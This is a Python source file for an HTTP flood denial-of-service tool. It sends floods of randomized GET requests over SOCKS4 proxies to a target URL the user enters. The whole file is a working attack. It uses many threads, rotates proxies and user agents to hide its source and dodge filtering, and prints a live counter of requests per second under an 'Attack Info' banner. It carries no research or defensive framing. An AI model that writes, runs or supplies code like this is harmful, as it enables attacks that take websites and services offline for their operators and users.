from random_user_agent.user_agent import UserAgent
import threading
import random
import logging
import socket
import socks
import time
import sys
import ssl

logging.basicConfig(
	format="[%(asctime)s] %(message)s",
	datefmt="%H:%m:%S",
	level=logging.INFO
)

active_threads = 0
try:
	max_threads = int(input("Max Threads: "))
except Exception:
	print(f"Invalid max threads: {f}")
	sys.exit()
except KeyboardInterrupt:
	sys.exit()
hrs = 0
bps = 0

try:
	proxy_list = open(input("Proxy List: "), "r")
except Exception as e:
	print(f"Invalid proxy list file!")
	sys.exit()
proxies = proxy_list.readlines()
proxy_list.close()
usera = UserAgent()

chars = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"
chars_list = chars

context = ssl.create_default_context()

def hflood(host, port, proxy_host, proxy_port, timeout=5, https=True, path="/", url_params=None):
	try:
		global active_threads
		global hrs
		global bps
		active_threads += 1
		sock = socks.socksocket()
		sock.settimeout(timeout)
		sock.set_proxy(socks.SOCKS4, proxy_host, int(proxy_port))
		sock.connect((host, port))
		if https:
			sock = context.wrap_socket(sock, server_hostname=host)
			#print(sock.version())
		for _ in range(777):
			list_param = random.choices(chars_list, k=77)
			params = "".join(list_param)
			ua = usera.get_random_user_agent()
			http = f"GET {path}?{params}{url_params} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\n\r\n"
			send = sock.send(http.encode())
			hrs += 1
			bps += send
			#logging.info(f"Sent {send} bytes of data")
			#logging.debug(sock.recv(100))
	except Exception as e:
		logging.debug(f"hflood error: {e}")
		pass
	finally:
		active_threads -= 1

def hrsv():
	global hrs
	global bps
	separator = " " * 5
	while True:
		time.sleep(1)
		print(f"HR/s: {hrs} {separator[len(str(hrs)):]} AT: {active_threads} {separator[len(str(active_threads))]} kB/s: {bps / 1000:.2f}")
		hrs = 0
		bps = 0

url = input("URL: ").strip()
try:
	protocol, host = url.split("://")
except ValueError:
	print("Invalid URL. Format: https://example.com/path/")
	sys.exit()
try:
	host, path = host.split("/", 1)
except ValueError:
	path = ""
	pass
try:
	path, params = path.split("?", 1)
	params = f"&{params}"
except ValueError:
	params = ""
	pass
try:
	host, port = host.split(":", 1)
except ValueError:
	port = 80
	pass
if protocol == "https":
	https = True
	port = 443
else:
	https = False
path = f"/{path}"
port = int(port)
print(f"[---] Attack Info [---]\r\nHost: {host}\r\nIP: {socket.gethostbyname(host)}\r\nPort: {port}\r\nPath: {path}\r\nParameters: {params[1:]}\r\nProtocol: {protocol}\r\nMax Threads: {max_threads}\r\nProxies: {len(proxies)}\r\n")
input("Press enter to initialize.")
threading.Thread(target=hrsv, daemon=True).start()
while True:
	for proxy in proxies:
		proxy = proxy.strip()
		proxy_host, proxy_port = proxy.split(":")
		while True:
			if active_threads >= max_threads:
				continue
			logging.debug(f"Starting thread with {proxy_host} proxy")
			threading.Thread(target=hflood, args=[host, port, proxy_host, proxy_port, 10, https, path, params], daemon=True).start()
			break
